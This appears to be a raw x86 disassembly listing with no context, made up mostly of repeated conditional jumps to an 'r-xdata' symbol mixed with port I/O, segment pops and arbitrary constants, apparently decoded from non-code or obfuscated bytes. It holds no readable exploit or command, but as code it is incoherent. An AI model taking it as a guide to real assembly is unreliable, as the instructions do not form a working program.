jae r-xdata
out dx eax
jae r-xdata
dec eax
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
cmp ah ch
sbb al 0x66
jae r-xdata
outsb
out dx al
jae r-xdata
cmp cl [ edx ]
jae r-xdata
push 0x326e0a3d
sbb al 0x1c
mov [ 0xffffffffe3e70f0a ] eax
jae r-xdata
enter 0x20e2 0x73
jae r-xdata
mov esp ebx
jae r-xdata
out dx eax
jae r-xdata
sti
jpo r-xdata
or dh [ 0x73e3e3f2 ]
pushad
jae r-xdata
sbb ebx [ esi ]
jae r-xdata
sbb bl [ esp + ebx ]
mov ecx [ esi ]
sbb [ eax - 0x5ef44a8b ] al
sbb [ esp + ebx ] bl
mov ecx [ eax - 0x4a5e5e17 ]
rcr [ edx ] 0x1
sbb al 0x1c
jecxz r-xdata
jae r-xdata
or dh [ edi - 0x14 ]
jecxz r-xdata
jae r-xdata
push cx
mov ecx 0x6a858089
push 0xec156613
or edx eax
sbb bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
daa
sbb al 0x60
jae r-xdata
or [ ecx ] 0xffffffe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x96
jmp r-xdata
or esp [ esi + 0x5 ]
sbb al 0x1c
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jmp r-xdata
leave
jecxz r-xdata
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
mov dh 0x68
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb
inc ebx
in al dx
jecxz r-xdata
add [ esp + ebx ] bl
jecxz r-xdata
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
jg r-xdata
xor bl [ esp + ebx ]
or ch [ esi + 0x731c1c33 ]
mov edi esp
mov esp ebx
shl ebx cl
add eax 0x766e1c1c
adc ebx [ eax ]
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xec1c663b
shl [ ebx ] 0x1
outsb
or cl [ eax + 0x1 ]
jecxz r-xdata
sbb al 0xb5
jmp r-xdata
iretd
fwait
loope r-xdata
mul ebx
jecxz r-xdata
push ebx
cmp al 0x1c
sbb al 0x60
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
outsb
outsb
adc ebx [ eax ]
jecxz r-xdata
mov [ ebx - 0x1c18f0f6 ] esp
jae r-xdata
pushad
sahf
pop ds
jecxz r-xdata
or edi [ ebp - 0x451c1c18 ]
mov edx 0x67ec2366
mov bl 0x32
movsd [ di ] [ si ]
xor bl [ esp + ebx ]
sbb al 0x96
pop ds
mov bl 0xa
jbe r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
outsd
jecxz r-xdata
dec edi
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
loop r-xdata
punpckldq mmx1 [ edi ]
outsd
out 0xe3 eax
jecxz r-xdata
or cl [ edi ]
jae r-xdata
jne r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata

jae r-xdata
loopne r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
mov ah 0xa
out 0xe3 eax
sbb al 0x1c
mov edx 0xec2366ba
mov bl 0x32
mov edx 0x13ae6a85
or cl ah
xor eax 0x6e731c1c
sub bx [ esi ]
jae r-xdata
jae r-xdata
dec ebx
and bl 0xe3
and al 0xa7
jae r-xdata
daa
test [ edx ] 0x1c1c1fcf
jae r-xdata
jae r-xdata
jecxz r-xdata
jne r-xdata
mov edx 0x7a1c1c7d
jecxz r-xdata
outsb
jae r-xdata
mul [ esi + 0x23 ]
or dl bh
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
cmc
push 0xa66a8521
sti
or dl [ ebp + 0x731c1c32 ]
jae r-xdata
mov [ ecx + edi * 4 + 0x6a858089 ] ecx
sbb al 0x1c
jae r-xdata
jae r-xdata
xchg esi eax
or ebx [ esp + esi * 2 ]
jpo r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
fsub [ eax ]
in al dx
adc al 0x1a
mov ah 0xb1
jae r-xdata
jae r-xdata
pop edx
sbb al 0xe3
jecxz r-xdata
mov edx 0x7a1c1c7d
jae r-xdata
push 0x1ce38913
and ecx [ edx ]
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
scasb [ edi ]
xor ebx [ esp + ebx ]
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
or bh [ ecx + 0x39 ]
sbb al 0x1c
jae r-xdata
out 0x8b eax
jecxz r-xdata
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
fsub [ esi + 0x35d70aeb ]
sbb al 0x1c
jae r-xdata
and [ edx ] ecx
or cl [ ebx - 0x1a ]
jecxz r-xdata
or ch dl
jmp ebx
jecxz r-xdata
jae r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop ds
or cl [ edi ]
jmp 0x73ba2621
jae r-xdata
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ebx esp
jecxz r-xdata
jecxz r-xdata
fidivr [ esi - 0x76981311 ]
retn
jae r-xdata
sbb al 0xa7
jecxz r-xdata
and esi [ ebx - 0x764a1d77 ]
jae r-xdata
jae r-xdata
push 0x9d0abc22
pop es
sbb al 0x1c
in al 0xe3
jecxz r-xdata
and ah ch
sbb al 0x73
jae r-xdata
jae r-xdata
sbb eax 0xab51c1c
mov eax 0x7373202a
jae r-xdata
out 0x1c eax
cmpsd [ esi ] [ edi ]
push 0xe0610a0f
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
xor eax 0x73e3e3f2
jae r-xdata
jae r-xdata
jae r-xdata
or edx [ esi ]
jae r-xdata
jecxz r-xdata
mov ch 0x9b
jae r-xdata
jae r-xdata
outsb
sbb al 0x73
jae r-xdata
mov esp ebx
jecxz r-xdata
mov edi 0x67ecf7c7
outsd
or bl [ ebx + 0x73e3e3e1 ]
loop r-xdata
jae r-xdata
jmp ebx
jecxz r-xdata
loopne r-xdata
mov edx esp
jae r-xdata
or al [ ebp + ebx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp edx
jae r-xdata
sbb al 0x73
or al [ ebp + ebx + 0x1c ]
jae r-xdata
pop ebp
out 0xe3 eax
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
mov bl 0x89
jae r-xdata
mov eax 0xae3e3e2
jae r-xdata
and bh [ edx + ecx + 0x1c1c079d ]
jae r-xdata
jecxz r-xdata
mov bl 0x89
loope r-xdata
jae r-xdata
imul ebp ebx 0x68
cmpsb [ esi ] [ edi ]
pop ds
mov [ 0xa1fa66a ] eax
add eax 0x731c1c0c
daa
jae r-xdata
jae r-xdata
sbb al 0x97
cmp eax 0x27601c1c
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
jae r-xdata
or bl dl
cmp ebx [ esp + ebx ]
fwait
imul esp edi 0xffffffda
shl [ ecx ] 0x1
push 0xf3961422
movsd [ edi ] [ esi ]
xor [ edx ] cx
stc
jae r-xdata
push ebp
jae r-xdata
jae r-xdata
out dx eax
in al dx
mov ebx eax
jecxz r-xdata
or cl [ esi + 0x73e3e3f0 ]
jae r-xdata
or [ 0x480a1c1c ] 0xe3f2
jae r-xdata
or [ ds : esp + ebx ] ebx
bound bx [ 0xab51c1c ]
mov ch 0x89
jae r-xdata
xchg edi eax
jae r-xdata
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
inc esp
jae r-xdata
loope r-xdata
sub ch ah
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x75
mov eax esp
loop r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
push esp
das
cmp eax 0x1c40348e
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
loop r-xdata
aaa
jae r-xdata
scasb [ edi ]
pop ds
mov dl 0xb3
mov ecx esp
mov edi [ 0x1c40348e ]
jae r-xdata
sbb al 0x96
lea eax [ ebp - 0x5c385896 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
or eax 0x480a1c1c
jae r-xdata
jae r-xdata
sti
jae r-xdata
jae r-xdata
or ah [ eax + 0x1d ]
sbb al 0x1c
jae r-xdata
mov ch 0x97
jae r-xdata
jae r-xdata
jae r-xdata
or [ 0x480a1c1c ] 0x73e3e3f2
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
xor eax [ bp + di ]
sub ch ah
jae r-xdata
mov dl 0xb3
test [ edx - 0x59 ] ebp
jae r-xdata
mov ax 0xe3e2
jecxz r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
fiadd [ ebx - 0x131c1cf7 ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
outsb
sub bx [ esi ]
pushad
push 0xffffffa7
jae r-xdata
mov bl 0x85
push 0xffffffa7
mov ah 0xb0
sbb al 0x75
jae r-xdata
jecxz r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
or al [ esi + 0x5 ]
jae r-xdata
sbb al 0xb5
jae r-xdata
jae r-xdata
jae r-xdata
out 0x6e eax
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push 0xffffffa7
jae r-xdata
pop di
sbb [ esp + ebx ] ebx
or dl [ ebx + 0x731c1c36 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
mov edi esp
cmpsd [ esi ] [ edi ]
sar ebx cl
or cl [ edx + ebx + 0x1c ]
sbb al 0x73
bound ecx [ edi ]
in al dx
jae r-xdata
psllq mm4 mm7
mov al 0x1c
jne r-xdata
dec ebx
out 0xe3 al
jecxz r-xdata
ror [ edx ] cl
pop es
jae r-xdata
sbb al 0x1c
mov bl 0x1c
sub ebx [ esi ]
mov edx 0xec2366bc
jl r-xdata
cld
mov ebx edx
or al [ edi ]
jae r-xdata
sbb al 0x1c
or cl cl
sbb [ esp + ebx ] bl
mov [ ebx + 0x1fa66a85 ] ebx
test [ edx - 0x52 ] ebp
adc eax 0x7a66eba
mov bl 0xa
and edi esi
jecxz r-xdata
sub ebx [ esi ]
jae r-xdata
jae r-xdata
test [ edx - 0x59 ] ebp
jae r-xdata
dec eax
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
add eax 0x73731c1c
jae r-xdata
xchg edi eax
jae r-xdata
or cl [ eax - 0xe ]
jae r-xdata
jae r-xdata
inc esi
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
xor eax [ ebx ]
jae r-xdata
jecxz r-xdata
adc ecx [ ecx - 0x644ae31d ]
sbb al 0x1c
or esi [ ebx + 0x5 ]
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
or esi [ ebx + 0x6f6e6eb5 ]
push ds
sbb al 0x1c
or esp [ esi + 0x5 ]
sbb al 0x1c
mov edx 0x4930aba
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a85e289
cmpsd [ esi ] [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
outsb
cmp edi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sub [ esp + ebx ] bh
jae r-xdata
jae r-xdata
pushad
lahf
sbb [ esp + ebx ] ebx
jecxz r-xdata
in al dx
jae r-xdata
arpl bx sp
mov [ 0xffffffff85e289bb ] eax
push 0xffffffa7
jae r-xdata
mov al [ 0xfffffffff365ecfb ]
jae r-xdata
jae r-xdata
outsb
sbb al 0xb
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sbb al 0x6e
cmp al 0x1c
jae r-xdata
pushad
sahf
jae r-xdata
cmpsd [ esi ] [ edi ]
out dx eax
jg r-xdata
and bp sp
pop si
cmpsd [ esi ] [ edi ]
pushad
xchg edi eax
jecxz r-xdata
in al dx
jae r-xdata
add [ esp + ebx ] bl
fisub [ eax - 0xc9a1305 ]
jae r-xdata
add eax 0x68e3e3ef
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0x63681ba6
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
push 0xd00aebae
push ds
sbb al 0x1c
mov edx [ esi ]
sbb al 0x1c
jae r-xdata
mov ah 0xb3
push ebx
push ds
sbb al 0x1c
or ebp [ edx ]
sbb al 0x1c
and bp sp
adc ax 0x9e0a
adc eax 0x73731c1c
sti
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push 0xffffffa6
pop ds
pushad
cmpsb [ esi ] [ edi ]
pop ds
out 0xec eax
push esp
in al dx
cmp eax 0x6e1c1c0e
outsb
jae r-xdata
pop es
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
sbb ebp [ eax + 0x63 ]
jae r-xdata
sahf
sub ecx [ edx ]
push ebx
cmp al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
scasb [ edi ]
jmp r-xdata
in al dx
and eax 0x6e1c1c03
adc bx [ eax ]
sbb al 0x1c
or eax [ 0x68e3e3ef ]
and esp [ ebx + 0x7373202a ]
jae r-xdata
adc al 0x3b
clc
mov ah 0x97
jae r-xdata
in al dx
jae r-xdata
mov dl 0x1c
xchg esi eax
and ecx [ edx ]
in eax 0x1b
sbb al 0x1c
add [ gs : esp + ebx ] bl
test [ esi + 0x15 ] esp
or bl [ esi + 0x731c1c15 ]
pop ds
mov bl 0xa
dec esp
outsb
and eax 0x1c0df20b
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
or ah ch
sbb ebx [ esp + ebx ]
out dx al
and ebp ebx
arpl [ edi - 0x1d ] ax
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x3c ]
sbb al 0x1c
mov al 0xa
cmp bh bh
jecxz r-xdata
or ah [ ebx + ebp * 8 + 0x66ece3e3 ]
jae r-xdata
push 0xffffff9e
jae r-xdata
sbb al 0x1c
xor al 0x3
jae r-xdata
in al dx
mov dh 0xa
cmpsb [ esi ] [ edi ]
cmp [ esp + ebx ] bl
out 0xe3 al
or ch dh
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffff9e
pop ds
sbb al 0xb5
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
jae r-xdata
jae r-xdata
and ebp ecx
outsb
cmpsd [ esi ] [ edi ]
shl [ ebx ] 0x1
push 0xffffffa7
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0xdf20b25
jae r-xdata
jae r-xdata
jae r-xdata
mov edi esp
jecxz r-xdata
jae r-xdata
jae r-xdata
je r-xdata
push 0xb5b0b20f
and [ ecx ] ecx
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
push 0xffffffa6
jae r-xdata
jecxz r-xdata
jae r-xdata
or ch bh
jae r-xdata
or esi edx
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
xor eax 0x961c1c1c
pop ss
sbb al 0xb4
mov bl 0x89
sbb al 0xa

jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
or al [ eax - 0x1b ]
jecxz r-xdata
sbb al 0x1c
or ch dl
cmp eax 0x73731c1c
sbb al 0x1c
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
adc eax 0x85bb8689
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
push 0xffffffa6
pop ss
or bl [ esi - 0x49e3e3d4 ]
or al [ ecx + 0x3c ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
xchg esp eax
adc [ ecx + 0x57a62486 ] 0xbb
xchg [ ebp + 0x5ba624b5 ] cl
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah 0xb
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x720a8c89
aaa
jae r-xdata
jae r-xdata
sahf
out dx eax
jecxz r-xdata
out dx eax
jecxz r-xdata
jae r-xdata
pushad
pxor mmx1 [ ecx + 0xd310aeb ]
sbb al 0x1c
jae r-xdata
jae r-xdata
xor ebp esp
push esp
pushad
and ah cl
or cl [ edx + 0x731c1c15 ]
jae r-xdata
sub bh ch
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xa
jae r-xdata
mov bl 0x6a
jae r-xdata
cli
mov [ edx + ecx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] cl
jno r-xdata
jpe r-xdata
sahf
sbb al 0x96
jae r-xdata
aas
jae r-xdata
mov ebx esi
outsb
daa
mov bl 0xa
mov ecx 0x731c1c18
jae r-xdata
das
and al 0xa6
jae r-xdata
lahf
jae r-xdata
jae r-xdata
mov [ edx ] cs
jae r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
out dx eax
int3
cld
jae r-xdata
jecxz r-xdata
jae r-xdata
or ah [ edi + ebp * 8 + 0x6e73e3e3 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x1c14060a ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
adc [ esp + ebx ] bl
adc ch [ edi ]
sbb al 0x1c
mov edx 0x66ec2366
pop esi
xor al 0x3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
dec ecx
jmp 0xffffffff88ba2984
imul edx [ ebx - 0x1d ] 0xffffffe3
jae r-xdata
add eax 0xf5810abb
jecxz r-xdata
sbb eax [ ebp + 0xa1b9e6a ]
sub cl [ edx ]
jae r-xdata
in al dx
sbb al 0x1c
jae r-xdata
jmp r-xdata
xchg esi eax
sbb al 0x1c
mov esp ebx
jecxz r-xdata
push 0xffffff9e
jae r-xdata
jae r-xdata
jecxz r-xdata
mov esi 0xeb280a3b
jae r-xdata
sub bl ch
or esi [ edi ]
mov bl 0x1c
jae r-xdata
mov edx 0x6a85bb89
cmpsb [ esi ] [ edi ]
pop ss
test [ edx - 0x52 ] ebp
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
sbb al 0x73
sbb al 0x1c
jb r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
and edi [ ebp + 0x73202ab8 ]
outsb
jae r-xdata
add ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sub ah [ eax ]
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
or bl [ eax + 0x731c1c30 ]
jae r-xdata
or dh [ ecx + 0xf ]
outsb
cmpsb [ esi ] [ edi ]
cmp esi [ ebx + 0x6a3f961c ]
jae r-xdata
sbb al 0x1c
mov [ ebx - 0x7a5b7647 ] ebx
push 0xffffffb6
jns r-xdata
push ds
lahf
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebp + 0x3a260bb3 ]
sbb al 0x1c
mov ch 0x8b
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata

or ch [ eax ]
jae r-xdata
jae r-xdata
scasb [ edi ]
scasb [ edi ]
jae r-xdata
mov bl 0x1c
je r-xdata
xchg di ax
sbb [ esp + ebx ] bl
jae r-xdata
sbb al 0x1c
jecxz r-xdata
mov bl 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
jae r-xdata
jae r-xdata
out 0xa eax
movsb [ edi ] [ esi ]
in al dx
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
sahf
pop ds
in al dx
sbb al 0xf0
jecxz r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
sub esi [ ebx - 0x5f5e377 ]
jae r-xdata
sbb al 0xd0
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
dec edi
push 0xab3eb96
mov dh 0x41
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
mov ecx 0x45ae6a85
mov [ esi + 0x7fb66a85 ] edx
mov ecx 0x7db66a85
test [ edx - 0x5a ] ebp
dec ecx
push 0x8923d035
xchg edi eax
test [ edx - 0x4a ] ebp
inc ecx
jae r-xdata
pushad
jae r-xdata
jmp r-xdata
jae r-xdata
outsb
mov ebx 0xf710a86
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
pop edi
jecxz r-xdata
daa
fisttp [ edx ]
inc ebp
xor eax 0x6a851c1c
scasb [ edi ]
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata

jae r-xdata
jae r-xdata
mov ah 0xb0
mov ah 0x89
sbb al 0xa
0x731c1c3d 0x7373
jae r-xdata
jae r-xdata
and ebp [ edx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + edi * 4 + 0x73202ab8 ]
jae r-xdata
test [ esi + 0x2a ] esp
push 0xffffffbe
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
cwde
xor [ esp + ebx ] bl
sub cl [ edx ]
jae r-xdata
cmp ecx [ edx ]
fwait
push ds
sbb al 0x1c
mov al 0xb3
or al dh
call 0x73ba2bc4
sbb al 0x74
or esp ebx
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
or bl [ eax - 0x5 ]
jecxz r-xdata
sbb al 0x1c
or ah [ ebx + 0x731c1c10 ]
mov [ ebx + 0x17a66a85 ] edi
jae r-xdata
jae r-xdata
jae r-xdata
or bh dl
and [ ebx + 0x73 ] dh
pushad
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
pop ds
or al [ ebp + 0x7373e3e3 ]
jae r-xdata
pop ss
push 0xffffff9e
insd
or al 0x1c
sbb al 0xb2
sbb al 0x96
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
mov edx ebp
jecxz r-xdata
mov bl 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffae
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x731c1c16 ]
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb esp eax
scasb [ edi ]
pop ds
xor esp edx
loop r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x6e
sahf
cmp ebp [ esi + 0x6e ]
push ebx
push ds
sbb al 0x1c
or ebx [ ecx ]
sub ebx [ esp + ebx ]
and bp sp
pop ds
cmp [ esp + ebx ] ebx
or bh [ eax + 0x731c1c33 ]
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and bp sp
or esi ebx
jae r-xdata
jae r-xdata
add esi [ ebx + 0x1897666e ]
sbb al 0x1c
sub edx [ ecx + 0x24aeb586 ]
and al 0xa6
inc ebp
jae r-xdata
or edx eax
and ecx [ edx ]
inc eax
in eax 0xe3
jecxz r-xdata
jae r-xdata
mov dl 0xb0
jae r-xdata
xchg edi eax
adc al 0x1c
mov ebx eax
test [ edx - 0x5a ] ebp
sar [ eax ] 0x1
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
jne r-xdata
or ah [ ecx + 0x16 ]
jae r-xdata
jae r-xdata
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jae r-xdata
dec ebp
push 0x2fa66e2d
test [ edx - 0x6a ] ebp
push 0xffffffa6
mov ebx ebp
sbb al 0x1c
shr [ edx ] 0x1
mov [ 0xab42bc8 ] al
push edi
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
out dx eax
mov ch 0xb4
or esp ebx
jae r-xdata
jecxz r-xdata
[ eax - 0x53 ]
jecxz r-xdata
push esp
jae r-xdata
mov esp 0xa2366bd
push ebp
fmul [ ebx ]
jae r-xdata
jae r-xdata
aaa
push ds
sbb al 0x1c
mov bl 0xb0
push 0x5e
aaa
ja r-xdata
sahf
or esp [ ecx - 0x45e3e3ff ]
jae r-xdata
jecxz r-xdata
loop r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
or al [ eax ]
xor eax 0x73731c1c
jae r-xdata
mov edi 0xb32354ec
jae r-xdata
jae r-xdata
int1
cmp [ esp + ebx ] bl
outsb
sbb al 0x66
and ebp esp
and bp sp
sti
mov ch 0xb
mov eax [ 0xffffffffba1c1c01 ]
jae r-xdata
or dh [ ecx ]
or eax 0x73731c1c
jae r-xdata
mov al 0xa
unpckhps xmm3 [ esp + ebx ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
mov bl 0x68
jae r-xdata
adc bl [ esp + ebx ]
in al dx
jae r-xdata
xchg ecx eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edi 0xbdc0abb
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov [ edi + 0x1c07710a ] esp
sbb al 0x73
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
mov ch 0x89
cmpsd [ esi ] [ edi ]
or dh [ ecx + 0x7 ]
sbb al 0x1c
sbb ecx [ ecx - 0x6f54465 ]
xor ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x5a ] ebp
adc [ ebx + 0x6a85cd89 ] edi
cmpsb [ esi ] [ edi ]
pop ss
mov ebx 0x15a66a85
mov [ esi - 0x59957a45 ] eax
fisttp [ 0x73731c1c ]
mov esi [ ebx ]
loop r-xdata
jae r-xdata
jae r-xdata
in al dx
nop
and eax 0x1c34c70b
jae r-xdata
push esp
cld
sbb al 0xec
jae r-xdata
or ch [ ecx + 0x12 ]
sbb al 0x1c
jae r-xdata
or dh ah
xor edi [ ebx + 0x1c0c370a ]
push 0xffffffa6
jae r-xdata
outsb
je r-xdata
jae r-xdata
or bl ah
jae r-xdata
jecxz r-xdata
sahf
or ecx [ edx ]
0x731c1c19 0x7373
jae r-xdata
mov sp 0x1c39
jae r-xdata
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
shl [ ebx ] 0x1
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
daa
jecxz r-xdata
sub [ ecx + ecx * 4 - 0x49957a5f ] edi
jpo r-xdata
push 0xffffff9e
jecxz r-xdata
jae r-xdata
and esi [ ebx - 0x38f4da98 ]
jae r-xdata
push ds
sbb al 0x1c
sbb al 0xb5
sub [ esp + ebx ] ebx
jae r-xdata
mov ebp 0x550a2366
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub bx [ esi ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xe26aefae
jae r-xdata
jae r-xdata
and al 0xa6
pop edx
shl ebx cl
jecxz r-xdata
or cl [ ecx ]
nop [ esi * 4 + 0xabbbf89 ] ebx
jecxz r-xdata
or ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
or dh dl
add al 0x1c
jae r-xdata
mov [ 0x1c0af70a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov [ edi + 0x41b66a85 ] edx
or ebp [ ebx ]
cmp ebx [ esp + ebx ]
jecxz r-xdata
or cl [ ecx + 0x73e3e3ea ]
mov ebx esp
jae r-xdata
push 0x34c70b25
jae r-xdata
or cl [ edi ]
jae r-xdata
jae r-xdata
cmp [ eax - 0x1c9c8ae4 ] dh
jecxz r-xdata
in al 0xe3
sbb al 0x97
sbb al 0x60
jae r-xdata
sbb al 0x1c
mov bl 0x1c
push ds
jae r-xdata
sbb al 0x1c
pushad
in al dx
push 0xa2cc811
jae r-xdata
mov bl 0x68
cmpsb [ esi ] [ edi ]
sbb ebp [ eax + 0x63 ]
inc edi
jecxz r-xdata
mov edx 0xd81fa66a
